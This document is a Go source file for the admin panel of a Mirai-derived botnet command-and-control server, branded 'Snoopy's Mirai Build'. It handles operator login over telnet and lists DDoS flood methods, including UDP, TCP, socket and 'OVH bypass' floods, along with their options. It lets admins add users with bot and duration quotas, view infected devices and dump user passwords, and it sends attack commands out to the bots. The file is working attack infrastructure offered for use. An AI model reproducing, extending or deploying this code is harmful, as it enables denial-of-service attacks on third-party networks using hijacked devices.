package main

import (
	"fmt"
	//"io/ioutil"
	"net"
	//"net/http"
	"strconv"
	//"strings"
	"time"
	"unicode/utf8"

	"github.com/shirou/gopsutil/cpu"
)

func StringToAsciiBytes(s string) []byte {
	t := make([]byte, utf8.RuneCountInString(s))
	i := 0
	for _, r := range s {
		t[i] = byte(r)
		i++
	}
	return t
}

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;255mUsername\033[0m: \033[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[38;5;255mPassword\033[0m:\x1b[38;5;196m \033[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\r\033[01;90mWrong credentials.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			gato, _ := cpu.Percent(time.Second, false)

			if aatk == true {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded %d | %d/5 Slots | Attacks --> Enabled | CPU: %.2f%%\007", BotCount, database.runningatk(), gato[0]))); err != nil {
					this.conn.Close()
					break
				}
			} else {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded %d | %d/5 Slots | Attacks --> Disabled | CPU: %.2f%%\007", BotCount, database.runningatk(), gato[0]))); err != nil {
					this.conn.Close()
					break
				}
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[38;5;255m   (:`--..___...-''``-._             |`._\r\n"))
	this.conn.Write([]byte("\x1b[38;5;255m     ```--...--.      . `-..__      .`/ _ |  \r\n"))
	this.conn.Write([]byte("\x1b[38;5;255m               `|     '       ```--`.    />\r\n"))
	this.conn.Write([]byte("\x1b[38;5;255m               : :   :               `:`-'\r\n"))
	this.conn.Write([]byte("\x1b[38;5;255m                `.:.  `.._--...___     ``--...__      \r\n"))
	this.conn.Write([]byte("\x1b[38;5;255m                   ``--..,)       ```----....__,) \r\n"))
	this.conn.Write([]byte("\x1b[38;5;255mWelcome To Snoopy's Mirai Build V0.1 \x1b[38;5;13m<3\r\n"))
	this.conn.Write([]byte("\r\n"))
	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[0m\x1b[\x1b[38;5;255m" + username + "\x1b[35m@\x1b[38;5;255mbotnet\x1b[0m:~/\x1b[38;5;255madmin/\x1b[38;5;165m# \x1b[0m"))
		cmd, err := this.ReadLine(false)

		if cmd == "clear" || cmd == "cls" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;255m   (:`--..___...-''``-._             |`._\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m     ```--...--.      . `-..__      .`/ _ |  \r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m               `|     '       ```--`.    />\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m               : :   :               `:`-'\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m                `.:.  `.._--...___     ``--...__      \r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m                   ``--..,)       ```----....__,) \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if userInfo.admin == 1 && cmd == "attacks" {
			this.conn.Write([]byte("\x1b[0mPlease specify 'enable', 'disable'.\r\n"))
			continue
		}
		if cmd == "help" || cmd == "HELP" || cmd == "?" || cmd == "methods" {
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m Methods:\033[94m:\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !udp 70.70.70.5 30 dport=30\033[0m\r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !udp\033[94m:\033[97m DGRAM UDP with less PPS Speed \033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !udphex\033[94m:\033[97m source port, default is random (eg. sport=55149)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !stdhex\033[94m:\033[97m Advanced Stdhex Method With Custom Strings\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !pps\033[94m:\033[97m NUDP flood(High PPS) Very good Game method\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !socket\033[94m:\033[97m Socket Flood \033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !bypass\033[94m:\033[97m Strong TCP bypass\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !tcp\033[94m:\033[97m TCP flood (urg,ack,syn) (Multi-Vector Attacks)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  !ovh\033[94m:\033[97m Custom ovh bypass\033[0m\r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			continue
		}
		if userInfo.admin == 1 && cmd == "enable" {
			aatk = true
			this.conn.Write([]byte("\x1b[0mAttacks have been enabled.\r\n"))
			continue
		}

		/*
			if err != nil || cmd == "NMAP" || cmd == "nmap" {
				this.conn.Write([]byte("\x1b[37mIP Address\x1b[0m: \x1b[35m"))
				locipaddress, err := this.ReadLine(false)
				if err != nil {
					return
				}
				url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
				tr := &http.Transport{
					ResponseHeaderTimeout: 5 * time.Second,
					DisableCompression:    true,
				}
				client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
				locresponse, err := client.Get(url)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
					continue
				}
				locresponsedata, err := ioutil.ReadAll(locresponse.Body)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\033[31mError IP address or host name only\033[37;1m\r\n")))
					continue
				}
				locrespstring := string(locresponsedata)
				locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
				this.conn.Write([]byte("\x1b[35mResponse\x1b[0m: \r\n\x1b[35m" + locformatted + "\r\n"))
			}
		*/
		//lists options
		if cmd == "OPTS" || cmd == "opts" || cmd == "options" { // attack options
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m Options:\033[94m:\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  port\033[94m:\033[97m destination port, default is random (eg. port=27015)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  sport\033[94m:\033[97m source port, default is random (eg. sport=55149)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  size\033[94m:\033[97m payload size, default is 512 (eg. size=256)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  minlen\033[94m:\033[97m minimum len for randomizing (eg. minlen=100)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  maxlen\033[94m:\033[97m maximum len for randomizing (eg. maxlen=512)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  rand\033[94m:\033[97m randomizing data, default is 0 (eg. rand=1)\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  payload\033[94m:\033[97m custom udp payload, default is null (eg. payload=01bbfdf5002126d0)\033[0m\r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			continue
		}
		//lists options

		// admin hub
		if userInfo.admin == 1 && cmd == "admin" {
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			this.conn.Write([]byte("\033[36m Commands\033[94m:\033[0m\r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  Bots\033[94m:\033[97m Displays Bots\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  list\033[94m:\033[97m Shows Everyones Usernamme + Password\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  adduser\033[94m:\033[97m adding basic user\033[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;255m  removeuser\033[94m:\033[97m removes user from database\033[0m\r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			continue
		}
		//admin hub

		if userInfo.admin == 1 && cmd == "ongoing" {
			if database.runningatk() != 1 {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0mThere are no attacks ongoing right now\r\n")))
				continue
			} else {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0mCommand: %s | Duration: %d | Total clients: %d\r\n", database.ongoingCommands(), database.ongoingDuration(), clientList.Count())))
				continue
			}
		}

		if userInfo.admin == 1 && cmd == "list" || cmd == "users" {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;255m%s\r\n", database.getusers())))
			continue
		}

		if userInfo.admin == 1 && cmd == "disable" {
			aatk = false
			this.conn.Write([]byte("\x1b[0mAttacks have been disabled.\r\n"))
			continue
		}

		if cmd == "" {
			this.conn.Write([]byte("\x1b[38;5;160mInvalid Command\r\n"))
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte("username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("max bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0m%s\r\n", "\x1b[0mCould not parse botcount. Please enter a number")))
				continue
			}
			this.conn.Write([]byte("maximum attack duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0m%s\r\n", "\x1b[0mCould not parse duration. Please choose from 0-3600")))
				continue
			}
			this.conn.Write([]byte("cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[0m%s\r\n", "\x1b[0mCould not parse cooldown. Please choose from 0-3600")))
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", "\x1b[0mCould not create user\x1b[0;32m!\x1b[0m")))
			} else {
				this.conn.Write([]byte("\x1b[0;32muser successfully inserted into database.\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			this.conn.Write([]byte("\033[36mConnected devices\033[94m:\033[0m\r\n"))
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\033[\033[255;255;255m%s\x1b[255m: \x1b[0m\t%d\r\n", k, v)))
			}
			this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[36mTotal devices\033[94m:\033[97m %d\033[0m\r\n", botCount)))
			continue
		}
		//admin features
		if userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
			}
			continue
		}

		//admin features

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0mAttack started, using up slot 1.\r\n", botCount)))
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
				} else {
					fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
				}
			}
		}
	}

}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
